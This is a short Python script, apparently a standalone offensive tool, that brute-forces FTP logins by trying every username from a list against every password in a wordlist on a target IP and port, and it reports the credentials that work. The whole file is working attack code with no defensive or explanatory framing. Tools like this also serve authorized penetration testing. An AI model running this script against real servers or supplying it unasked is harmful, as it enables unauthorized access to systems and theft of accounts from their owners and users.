import os
from ftplib import FTP, error_perm

def load_usernames(input_value):
    if os.path.isfile(input_value):
        with open(input_value, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        return [input_value.strip()]

def load_passwords(filepath):
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def ftp_brute_force(ip, port, usernames, passwords):
    print(f"[+] Starting FTP brute-force on {ip}:{port}")

    for username in usernames:
        for password in passwords:
            try:
                print(f"[*] Trying: {username}:{password}")
                ftp = FTP()
                ftp.connect(ip, port, timeout=5)
                ftp.login(user=username, passwd=password)
                print(f"[âœ”] SUCCESS -> {username}:{password}")
                ftp.quit()

                choice = input("Continue brute-force? (y/n): ").lower()
                if choice != 'y':
                    return

            except error_perm:
                print(f"[-] Invalid: {username}:{password}")
            except Exception as e:
                print(f"[!] Error: {e}")
            finally:
                try:
                    ftp.close()
                except:
                    pass

    print("[-] Brute-force complete. No valid credentials found.")

if __name__ == "__main__":
    target_ip = input("Target IP: ").strip()
    port_input = input("Port [default 21]: ").strip()
    target_port = int(port_input) if port_input else 21

    username_input = input("Username or path to username list: ").strip()
    password_file = input("Path to password wordlist: ").strip()

    usernames = load_usernames(username_input)
    passwords = load_passwords(password_file)

    ftp_brute_force(target_ip, target_port, usernames, passwords)
